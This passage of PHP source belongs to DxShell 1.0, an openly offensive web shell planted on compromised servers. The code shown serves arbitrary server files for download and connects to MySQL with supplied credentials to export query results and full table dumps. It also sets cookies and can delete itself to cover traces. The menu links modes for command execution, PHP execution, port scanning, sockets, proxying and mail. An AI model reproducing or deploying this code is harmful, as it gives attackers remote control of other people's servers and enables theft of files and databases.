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',
		'rename'=> 'R0lGODlhEAAQAJEAAP///wAAAP///wAAACH5BAEAAAIALAAAAAAQABAAAAIxlI8GC+kCQmgPxVmtpBnurnzgxWUk6GFKQp0eFzXnhdHLRm/SPvPp5IodhC4IS8EoAAA7',
		'ed'	=> 'R0lGODlhEAAQAKIAAAAzZv////3Tm8DAwJ7R/Gmd0P///wAAACH5BAEAAAYALAAAAAAQABAAAANDaAYM+lABIVqEs4bArtRc0V3MMDAEMWLACRSp6kRNYcfrw9h3mksvHm7G4sF8RF3Q1kgqmZSKZ/HKSKeN6I/VdGIZCQA7',
		'downl' => 'R0lGODlhEAAQAJEAADyFFIXQLajcOf///yH5BAEAAAMALAAAAAAQABAAAAI6nAepeY0CI3AHREmNvWLmfXkUiH1clz1CUGoLu0JLwtaxzU5WwK89HxABgESgSFM0fpJHx5DWHCkoBQA7',
		'gzip'	=> 'R0lGODlhEAAQAKIAAARLsHi+//zZWLJ9DvEZAf///wAAAAAAACH5BAEAAAUALAAAAAAQABAAAANCWLrQDkuMKUC4OMAyiB+Pc0GDYJ7nUFgk6qos56KwJs9m3eLSapc83Q0nnBhDjdGCkcFslgrkEwq9UKHS6dLShCQAADs=',
		);
	@ob_clean();
	if ((!isset($_GET['dximg'])) OR (!in_array($_GET['dximg'], array_keys($IMGS)))) $_GET['dximg']='noone';
	header('Cache-Control: public');
	header('Expires: '.Date('r', time()+60*60*24*300));
	header('Content-type: image/gif');
	print  base64_decode(   (is_array(($IMGS[$_GET['dximg']])))?$IMGS[$_GET['dximg']][1]:$IMGS[$_GET['dximg']]   );
	die();
	}

if ($_GET['dxmode']=='F_DWN')
	{
	if (!isset($_GET['dxfile'])) 		die(DxError('No file selected. Check $_GET[\'dxfile\'] var'));
	if (!file_exists($_GET['dxfile']))  die(DxError('No such file'));
	if (!is_file($_GET['dxfile'])) 		die(DxError('Hey! Find out how to read a directory in notepad, and u can call me "Lame" =) '));

	$DxDOWNLOAD_File=array(); /* prepare struct */
	$DxDOWNLOAD_File['filename']=basename($_GET['dxfile']);
	if (isset($_GET['dxparam']))
		$DxDOWNLOAD_File['headers'][]=('Content-type: text/plain'); /* usual look thru */
		else
		{		$DxDOWNLOAD_File['headers'][]=('Content-type: '.mime_content_type($_GET['dxfile']));
		$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename="'.basename($_GET['dxfile']).'";');
		}
	$DxDOWNLOAD_File['content']=file_get_contents($_GET['dxfile']);
	}

if ($_GET['dxmode']=='SQL' AND isset($_POST['dxparam']))
	{/* download query results */	if (!isset($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'],$_GET['dxsql_d'],$_POST['dxsql_q']))
		die(DxError('Not enough params: $_GET[\'dxsql_s\'],$_GET[\'dxsql_l\'],$_GET[\'dxsql_p\'],$_GET[\'dxsql_d\'],$_POST[\'dxsql_q\'] needed'));

	if ((mysql_connect($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'])===FALSE) or (mysql_errno()!=0))
		die(DxError('No connection to mysql server!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));
	if (!mysql_select_db($_GET['dxsql_d']))
		die(DxError('Can\'t select database!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));

	/* export as csv */
	$DxDOWNLOAD_File=array(); /* prepare struct */
	$DxDOWNLOAD_File['filename']='Query_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.csv';
	$DxDOWNLOAD_File['headers'][]=('Content-type: text/comma-separated-values');
	$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename="'.$DxDOWNLOAD_File['filename'].'";');
	$DxDOWNLOAD_File['content']='';

	$_POST['dxsql_q']=explode(';',$_POST['dxsql_q']);

	for ($q=0;$q<count($_POST['dxsql_q']);$q++)
		{		if (empty($_POST['dxsql_q'][$q])) continue;
		$num=DxMySQL_FetchResult(DxMySQLQ($_POST['dxsql_q'][$q], false), $DUMP, false);
		$DxDOWNLOAD_File['content'].="\n\n".'QUERY: '.str_replace(array("\n",";"), array('',"<-COMMA->"), str_replace("\r",'', $_POST['dxsql_q'][$q] )).";";
		if ($num<=0) {$DxDOWNLOAD_File['content'].="\n".'Empty;'; continue;}
		foreach ($DUMP[0] as $key => $val) $DxDOWNLOAD_File['content'].=$key.";"; /* headers */
		for ($l=0;$l<count($DUMP);$l++)
			{			$DxDOWNLOAD_File['content'].="\n";
			$INDEXES=array_keys($DUMP[$l]);
			for ($i=0; $i<count($INDEXES); $i++)
				$DxDOWNLOAD_File['content'].=str_replace(array("\n",";"), array('',"<-COMMA->"), str_replace("\r",'', $DUMP[$l][ $INDEXES[$i] ])).";";

			}
		}
	}

if ($_GET['dxmode']=='SQLD' AND isset($_POST['dxsql_tables']))
	{	if (!isset($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'],$_GET['dxsql_d'],$_POST['dxsql_tables']))
		die(DxError('Not enough params: $_GET[\'dxsql_s\'],$_GET[\'dxsql_l\'],$_GET[\'dxsql_p\'],$_GET[\'dxsql_d\'],$_POST[\'dxsql_tables\'] needed'));

	if ((mysql_connect($_GET['dxsql_s'],$_GET['dxsql_l'],$_GET['dxsql_p'])===FALSE) or (mysql_errno()!=0))
		die(DxError('No connection to mysql server!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));
	if (!mysql_select_db($_GET['dxsql_d']))
		die(DxError('Can\'t select database!'."\n".'<br>MySQL:#'.mysql_errno().' - '.mysql_error()));

	if (empty($_POST['dxsql_tables']))  die(DxError('No tables selected...'));

	$DxDOWNLOAD_File=array(); /* prepare struct */
	$DxDOWNLOAD_File['filename']='Dump_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.sql';
	$DxDOWNLOAD_File['headers'][]=('Content-type: text/plain');
	$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename="'.$DxDOWNLOAD_File['filename'].'";');
	$DxDOWNLOAD_File['content']='';

	$DxDOWNLOAD_File['content'].="\n\t".'/* '.str_repeat('=', 66);
	$DxDOWNLOAD_File['content'].="\n\t".'==== MySQL Dump '.DxDate(time()).' - DxShell v'.$GLOB['SHELL']['Ver'].' by o_O Tync';
	$DxDOWNLOAD_File['content'].="\n\t".'==== Server: '.$_GET['dxsql_s'];
	$DxDOWNLOAD_File['content'].="\n\t".'==== DB: '.$_GET['dxsql_d'];
	$DxDOWNLOAD_File['content'].="\n\t".'==== Tables: '."\n\t\t\t".implode(', '."\n\t\t\t", $_POST['dxsql_tables']);
	$DxDOWNLOAD_File['content'].="\n\t".str_repeat('=', 66).' */';

	if (!empty($_POST['dxsql_q']))
		{		$_POST['dxsql_q']=explode(';', $_POST['dxsql_q']);
		foreach ($_POST['dxsql_q'] as $CUR)
			if (empty($CUR)) continue; else DxMySQLQ($CUR, true); /* pre-query */
		}

	foreach ($_POST['dxsql_tables'] as $CUR_TABLE)
		{		$DxDOWNLOAD_File['content'].=str_repeat("\n", 5).'/* '.str_repeat('-', 40).' */';
		DxMySQL_FetchResult(DxMySQLQ('SHOW CREATE TABLE `'.$CUR_TABLE.'`;', false), $DUMP, true);
		$DxDOWNLOAD_File['content'].="\n".$DUMP[0][1];
		$DxDOWNLOAD_File['content'].="\n\n";
		DxMySQL_FetchResult(DxMySQLQ('SELECT * FROM `'.$CUR_TABLE.'`;', false), $DUMP, true);
		for ($i=0; $i<count($DUMP); $i++)
			{
			for ($j=0;$j<count($DUMP[$i]);$j++) $DUMP[$i][$j]=mysql_real_escape_string($DUMP[$i][$j]);
			$DxDOWNLOAD_File['content'].="\n".'INSERT INTO `'.$CUR_TABLE.'` VALUES ("'.implode('", "', $DUMP[$i]).'");';
			}
		}
	}

if ($_GET['dxmode']=='COOK' AND isset($_POST['dxparam']))
	{	foreach ($_POST['dxparam'] as $name => $val)
		{		if ($name=='DXS_NEWCOOK')
			{
			if (empty($val['NAM']) or empty($val['VAL'])) continue;			DxSetCookie($val['NAM'], $val['VAL'], time()+60*60*24*10);
			}
			else DxSetCookie($name, $val, (empty($val))?1:(time()+60*60*24*10));
		}
	DxGotoURL(DxURL('leave', 'dxmode'));
	die();
	}

if (isset($_GET['dxinstant']))
	{	$_GET['dxinstant']=strtoupper($_GET['dxinstant']);
	if ($_GET['dxinstant']=='DEL')
		{
		$ok=@unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
		print '<script>window.alert("SELF '.(  ($ok)?'deleted. Reload the page to believe me =)':'tried to delete but was unsuccessful'  ).'");</script>';
		}
	}

function DxObGZ($s) {return gzencode($s);}

if (isset($DxDOWNLOAD_File))
	{/* File downloader for everything */
	if (!$DXGLOBALSHIT)
		{
		if ($GLOB['SYS']['GZIP']['CanOutput'])
			{
			ini_set('output_buffering',4096);
			ob_start("DxObGZ");
			header('Content-Encoding: gzip');
			}		for ($i=0; $i<count($DxDOWNLOAD_File['headers']); $i++) header($DxDOWNLOAD_File['headers'][$i]);
		print $DxDOWNLOAD_File['content'];
		die();
		}
	/* if u want to download file when $DXGLOBALSHIT, scroll down */
	}

###################################################################################
####################++++++++++++++# M A I N #++++++++++++++++++####################
###################################################################################
if (!in_array($_GET['dxmode'], array_keys($GLOB['DxMODES']))) die(DxError('Unknown $_GET[\'dxmode\']! check $GLOB[\'DxMODES\'] array'));

########
########   Main HAT (blackhat? =))) )
########
if (!in_array($_GET['dxmode'], array_keys($GLOB['DxMODES']))) die('Unknown $_GET[\'dxmode\']');

if ($DXGLOBALSHIT)
	print str_repeat("\n", 20).'<!--SHELL HERE-->';
?>
<html><head><title><?=$_SERVER['HTTP_HOST'];?> --= DxShell 1.0 - by o_O Tync =-- :: <?=$GLOB['DxMODES'][$_GET['dxmode']];?></title>
<Meta Http-equiv="Content-Type" Content="text/html; Charset=windows-1251">
<link rel="shortcut icon" href="<?=DxURL('kill','dxmode');?>&dxmode=IMG&dximg=DxS">
<http://leet.phpnet.us/sh.gif>
<style>
img	 {border-width:0pt;}
body, td 		{font-size: 10pt; color: #00B000; background-color: #000000; font-family: Arial;padding:2pt;margin:2pt; vertical-align:top;}
h1				{font-size: 14pt; color: #00B000; background-color: #002000; font-family: Arial Black; font-weight: bold; text-align: center;}
h2				{font-size: 12pt; color: #00B000; background-color: #002000; font-family: Courier New; text-align: center;}
h3				{font-size: 12pt; color: #F0F000; background-color: #002000; font-family: Times New Roman; text-align: center;}
caption			{font-size: 12pt; color: #00FF00; background-color: #000000; font-family: Times New Roman; text-align:center; border-width: 1pt 3pt 1pt 3pt;border-color:#FFFF00;border-style:solid solid dotted solid;padding: 5pt 0pt;}
td.h2_oneline	{font-size: 12pt; color: #00B000; font-family: Courier New; text-align: center;background-color: #002000; border-right-color:#00FF00;border-right-width:1pt;border-right-style:solid;vertical-align:middle;}
td.mode_header	{font-size: 16pt; color: #FFFF00; font-family: Courier New; text-align: center;background-color: #002000; vertical-align:middle;}
table.outset, td.outset	  {border-width:3pt; border-style:outset; border-color: #004000;margin-top: 2pt;vertical-align:middle;}
table.bord, td.bord, fieldset   {border-width:1pt; border-style:solid; border-color: #003000;vertical-align:middle;}
hr   {border-width:1pt; border-style:solid; border-color: #005000; text-align: center; width: 90%;}
textarea.bout 		{border-color: #000000; border-width:0pt; background: #000000; font: 12px verdana, arial, helvetica, sans-serif; color: #00FF00; Scrollbar-Face-color:#000000;Scrollbar-Track-Color: #000000;}
td.listing	{background-color: #000500; font-family: Courier New; font-size:8pt; color:#00B000; border-color: #003000;border-width:1pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:top;}
td.linelisting  {background-color: #000500; font-family: Courier New; font-size:8pt; color:#00B000; border-color: #003000;border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
table.linelisting {border-color: #003000;border-width:0pt 1pt; border-style:solid;}
td.js_floatwin_header {background-color:#003300;font-size:10pt;font-weight:bold;color:#FFFF00;border-color: #00FF00;border-width:1pt; border-style:solid;border-collapse:collapse;}
td.js_floatwin_body	  {background-color:#000000;font-size:10pt;color:#00B000;border-color: #00FF00;border-width:1pt; border-style:solid;border-collapse:collapse;}
font.rwx_sticky_bit {color:#FF0000;}
.highlight_txt		{color: #FFFF00;}
.achtung			{color: #000000; background-color: #FF0000; font-family: Arial Black; font-size: 14pt; padding:0pt 5pt;}

input 			{font-size: 10pt;font-family: Arial; color: #E0E000; background-color: #000000; border-color:#00FF00 #005000 #005000 #FFFF00; border-width:1pt 1pt 1pt 3pt;border-style:dotted dotted dotted solid; padding-left: 3pt;overflow:hidden;}
input.radio		{border-width:0pt;color: #FFFF00;}
input.submit 	{font-size: 12pt;font-family: Impact, Arial Black; color :#00FF00; background-color: #002000; border-color: #00FF00; border-width:0pt 1pt 1pt 0pt; border-style: solid; padding:1pt;letter-spacing:1pt;padding:0pt 2pt;}
input.bt_Yes 	{font-size: 14pt;font-family: Impact, Arial Black; color :#00FF00; background-color: #005000; border-color: #005000 #005000 #00FF00 #005000; border-width:1pt 1pt 2pt 1pt; border-style: dotted dotted solid dotted; height: 30pt; padding:10pt; margin: 5pt 10pt;}
input.bt_No 	{font-size: 14pt;font-family: Impact, Arial Black; color :#FF0000; background-color: #500000; border-color: #500000 #500000 #FF0000 #500000; border-width:1pt 1pt 2pt 1pt; border-style: dotted dotted solid dotted; height: 30pt; padding:10pt; margin: 5pt 10pt;}
input.bt_Yes:Hover 	{color:#000000; background-color:#00FF00;border-bottom-color:#FFFFFF;}
input.bt_No:Hover 	{color:#000000; background-color:#FF0000;border-bottom-color:#FFFFFF;}
textarea 		{color:#00FF00; background-color:#001000;border-color:#000000;border-width:0pt;border-style:solid;font-size:10pt;font-family:Arial;Padding:5pt;
				Scrollbar-Face-Color: #00FF00; Scrollbar-Track-Color: #000500;
				Scrollbar-Highlight-Color: #00A000;	Scrollbar-3dlight-Color: #00A000; Scrollbar-Shadow-Color: #005000;
				Scrollbar-Darkshadow-Color: #005000;}
select			{background-color:#001000;color:#00D000;border-color:#D0D000;border-width:1pt;border-style:solid dotted dotted solid;}

A:Link, A:Visited { color: #00D000;	text-decoration: underline; }
A.no:Link, A.no:Visited { color: #00D000;	text-decoration: none; }
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: #00FF00; background-color:#003300; text-decoration: overline; }
.Hover:Hover {color: #FFFF00; cursor:help;}
.HoverClick:Hover {color: #FFFF00; cursor:crosshair;}
span.margin		{margin: 0pt 10pt;}
td.error {color:#000000; background-color: #FF0000; font-weight: bold; font-size: 11pt;}
td.warning {color:#000000; background-color: #D00000; font-size: 11pt;}
font.img_replacer {margin:1pt;padding:1pt;text-decoration: none;border-width:1pt;border-color:#D0D000;border-style:solid;}
</style>

<?php
if (in_array($_GET['dxmode'], array('UPL', 'DIR', 'PRT')))
	{  /* THIS FLOATING WINDOW IS ONLY SET FOR MODES: */?>
<SCRIPT>
var dom = document.getElementById?1:0;
var ie4 = document.all && document.all.item;
var opera = window.opera; //Opera
var ie5 = dom && ie4 && !opera;
var nn4 = document.layers;
var nn6 = dom && !ie5 && !opera;
var vers=parseInt(navigator.appVersion);
var good_browser = (ie5 || ie4);
function showwin(hdr,txt,w,vis)
{
if(good_browser)
	{
	var obj =  document.all('js_floatwin');
	var evnt = event;
	var xOffset = document.body.scrollLeft;
	var yOffset = document.body.scrollTop;

	var temp =
	"<TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH="+ w +">"
	+((hdr!='')?("<TR><TD class=js_floatwin_header>"+ hdr + "</TD></TR>"):"")
	+"<TR><TD class=js_floatwin_body>" + txt + "</TD></TR>"
	+"</TABLE>";

	if (vis == 1)
		{
		obj.innerHTML = temp;
		obj.style.width = w;
		hor = document.body.scrollWidth - obj.offsetWidth;
		posHor = xOffset + evnt.clientX + 10;
		posHor2 = xOffset + evnt.clientX - obj.offsetWidth - 5;
		posVer = yOffset + evnt.clientY - obj.offsetHeight - 5;

		if (posHor<hor)
			obj.style.posLeft = posHor
		else
			obj.style.posLeft = posHor2;

		obj.style.posTop = posVer;

		obj.style.visibility = "visible";
		}
		else
		{
		obj.style.visibility = "hidden";
		obj.style.posTop = 0;
		obj.style.posLeft = 0;
		}
	}
}
function movewin()
{
if (good_browser)
	{
	var obj =  document.all('js_floatwin');
	var evnt = event;
	var xOffset = document.body.scrollLeft;
	var yOffset = document.body.scrollTop;

	hor = document.body.scrollWidth - obj.offsetWidth;
	posHor = xOffset + evnt.clientX + 10;
	posHor2 = xOffset + evnt.clientX - obj.offsetWidth - 5;
	posVer = yOffset + evnt.clientY - obj.offsetHeight - 5;

	if (posHor<hor)
		obj.style.posLeft = posHor
		else
		obj.style.posLeft = posHor2;

	obj.style.posTop = posVer;
	}
}
</SCRIPT>
<?php } /* /END */?>

</head>
<body>
<?php
if ($DXGLOBALSHIT) /* tries to kill all the fucking bug.php pre-output, if ob_clean() failed */
	{	print str_repeat("\n", 10).'<!--SHIT KILLER-->';
	print "\n".'</body></a>'.str_repeat('</table>', 5).str_repeat('</div>', 5).str_repeat('</span>', 5).str_repeat('</pre>', 1).str_repeat('</font>', 5).str_repeat('</script>', 2);
	print "\n".'<TABLE WIDTH=100% BORDER=0  style="position:absolute;z-index:100;top:0pt;left:0pt;width:100%;height:100%;"><tr><td>';
	print "\n\n\n\n";
	}
?>

<div id="js_floatwin" style="z-index:50;position:absolute;left:0;top:0;visibility:hidden"></div>
<table width=100% cellspacing=0 cellpadding=0 class=outset>
<tr>
	<td width=100pt class=h2_oneline><a href="<?=DxURL('kill', '');?>&dxmode=WTF" class=no><h1>DxShell<br>v<?=$GLOB['SHELL']['Ver'];?></td>
	<td>
<?php
print "\n".'<div style="margin-right:'.(  ((strlen($GLOB['SHELL']['USER']['Login'])+strlen($GLOB['SHELL']['USER']['Passw']))>=2)?'100':'30'  ).'pt;">';
print "\n".(  ($DXGLOBALSHIT)?'<font color=#FF0000><b>GLOBALSHIT</b></font> ; ':''  );
print "\n".DxPrint_ParamState('php_ver', 		phpversion()						).' ; ';
print "\n".DxPrint_ParamState('php_Safe_Mode', 	$GLOB['PHP']['SafeMode'], '!'		).' ; ';
print "\n".DxPrint_ParamState('magic_quotes', 	(bool)get_magic_quotes_gpc(), '!'	).' ; ';
print "\n".DxPrint_ParamState('gZip', 			function_exists('gzencode')			).' ; ';
print "\n".DxPrint_ParamState('cURL', 			function_exists('curl_version')		).' ; ';
print "\n".DxPrint_ParamState('MySQL', 			function_exists('mysql_connect')	).' ; ';
print "\n".DxPrint_ParamState('MsSQL', 			function_exists('mssql_connect')	).' ; ';
print "\n".DxPrint_ParamState('PostgreSQL', 	function_exists('pg_connect')		).' ; ';
print "\n".DxPrint_ParamState('Oracle', 		function_exists('ocilogon')			).' ; ';
print "\n".'Disabled functions: '.((($df=@ini_get('disable_functions'))=='')?'<font color=#00FF00><b>NONE</b></font>':'<font color=#FF0000><b>'.str_replace(array(',',';'), ', ', $df).'</b></font>');
print "\n".'</div>';

print "\n\n".'<span align=right style="position:absolute;z-index:1;right:0pt;top:0pt;"><table><tr><td class="h2_oneline"><nobr>';
if ((strlen($GLOB['SHELL']['USER']['Login'])+strlen($GLOB['SHELL']['USER']['Passw']))>=2)
	print "\n".'<a href="'.DxURL('kill', 'dxinstant').'&dxinstant=logoff" title="Log Off" class=no>[Exit]</a>';
print "\n".'<a href="'.DxURL('kill', 'dxinstant').'&dxinstant=DEL" title="Delete self ('.basename($_SERVER['PHP_SELF']).')" class=no><font color=#FF0000;>'.DxImg('del').'</font></a>';
print "\n".'</nobr></td></tr></table></span>';

print "\n\n".'<hr>';
print "\n".'Disk free: <b>'.DxStr_FmtFileSize(disk_free_space($GLOB['FILES']['CurDIR'])).' / '.DxStr_FmtFileSize(disk_total_space($GLOB['FILES']['CurDIR'])).'</b> ; ';
print "\n".'OS: <b>'.$GLOB['SYS']['OS']['id'].' ('.$GLOB['SYS']['OS']['Full'].' )</b> ; ';
print "\n".'Yer_IP: <b>'.@$_SERVER['REMOTE_ADDR'].' ('.@$_SERVER['REMOTE_HOST'].')</b> ; ';
print "\n".'<nobr>Own/U/G/Pid/Inode:<wbr><b>'.get_current_user().' / '.getmyuid().' / '.getmygid().' / '.getmypid().' / '.getmyinode().'</b> ; </nobr>';
print "\n".'MySQL : <b>'.@mysql_get_server_info().'</b> ; ';
print "\n".'<br>'.@$_SERVER['SERVER_SOFTWARE'];
?>
	</td>
</table>
<table width=100% cellspacing=0 cellpadding=0 class=outset>
<tr>
	<td width=100pt class=h2_oneline><h2>Modes</td>
	<td style="text-align:center;"><nobr>
	<a href="<?=DxURL('kill', '');?>&dxmode=DIR">DIR</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=F_VIEW">VIEW</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=FTP<?=((!empty($_GET['dxdir']))?'&dxdir='.$_GET['dxdir']:'');?>">FTP</a>
	<td><font class=highlight_txt><big><b>II</td><td style="text-align:center;"><nobr>
	<a href="<?=DxURL('leave', 'dxsql_s,dxsql_l,dxsql_p,dxsql_d');?>&dxmode=SQL">SQL</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=PHP">PHP</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=COOK">COOKIE</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=CMD">CMD</a>
	<td><font class=highlight_txt><big><b>II</td><td style="text-align:center;"><nobr>
	<a href="<?=DxURL('kill', '');?>&dxmode=MAIL">MAIL</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=STR">STR</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=PRT">PORTSCAN</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=SOCK">SOCK</a> |
	<a href="<?=DxURL('kill', '');?>&dxmode=PROX">PROXY</a>
	</td>
	</tr>
</table>

<?php $DX_Header_drawn=true; ?>

<?php
#################################################
########
########   DXGLOBALSHIT DOWNLOADER
########
if (isset($DxDOWNLOAD_File)) /* only when DXGLOBALSHIT is enabled */
	{	print "\n".'<table align=center><tr><td class=mode_header><b>Download file</td></tr></table>';
	print "\n".'The fact you see this means that "'.basename($_SERVER['PHP_SELF']).'" has fucked up the output with it\'s shit, so no headerz could be sent =((';
	print "\n".'<br>Exclusively, DxShell is proud to present an additional way to download files...Just execute the php-script given below, and it will make the file u\'re trying to download';

	if ($GLOB['SYS']['GZIP']['CanUse'])  $DxDOWNLOAD_File['content']=gzcompress($DxDOWNLOAD_File['content'], 6);

	print "\n\n".'<br><br>';
	print "\n".'<textarea rows=30 style="width:90%" align=center>';
	print "\n".'<?php'."\n".' //Execute this, and you\'ll get the requested "'.$DxDOWNLOAD_File['filename'].'" in the same folder with the script ;)';
	print "\n".'// The file is '.(  ($GLOB['SYS']['GZIP']['CanUse'])?'gzcompress()ed and':''  ).' base64_encode()ed';
	print "\n\n".'$encoded_file=\''.base64_encode($DxDOWNLOAD_File['content']).'\';';
	print "\n\n\n\n";
	print "\n".'$f=fopen(\''.$DxDOWNLOAD_File['filename'].'\', \'w\');';
	print "\n".'fputs($f, '.(  ($GLOB['SYS']['GZIP']['CanUse'])?'gzuncompress(base64_decode($encoded_file))':'base64_decode($encoded_file)'  ).');';
	print "\n".'fclose($f);';
	print "\n".'//Yahoo, hacker, the file is here =)';
	print "\n".'?>';
	print "\n".'</textarea>';
	die();
	}

?>

<table align=center>
	<tr><td class=mode_header>
	@MODE: <b><?=$GLOB['DxMODES'][$_GET['dxmode']];?>
	</td></tr></table>
<?

########
########   AboutBox
########
if ($_GET['dxmode']=='WTF')
	{
	?>
<table align=center class=nooooneblya><tr><td><div align=center>
<?php
print '<a href="http://hellknights.void.ru/">'.DxImg('exec').'</a>';
print '<br>o_O Tync, ICQ# 244-648';
?><br><br>
<textarea name="LolBox" class=bout style="width:500pt; height:500pt;"></textarea></table>
<SCRIPT language=Javascript><!--
var tl=new Array(
"Kilobytes of c0de, litres of beer, kilometers of cigarettes (*no drugs*), and for what purpose?",
"What's wrong with other shells?",
"Usability, functionality, bugs?... NO.",
"The main bug is: these shells ARE NOT mine =)",
"Just like to be responsible for every motherfucking byte of code.",
"Enjoy!",
"-----------------------------------",
"o_O Tync, http://hellknights.void.ru/, ICQ#244648",
"DxShell v<?=$GLOB['SHELL']['Ver'].', date '.$GLOB['SHELL']['Date'];?>",
"",
"Greetz to: ",
"iNfantry the Ruler",
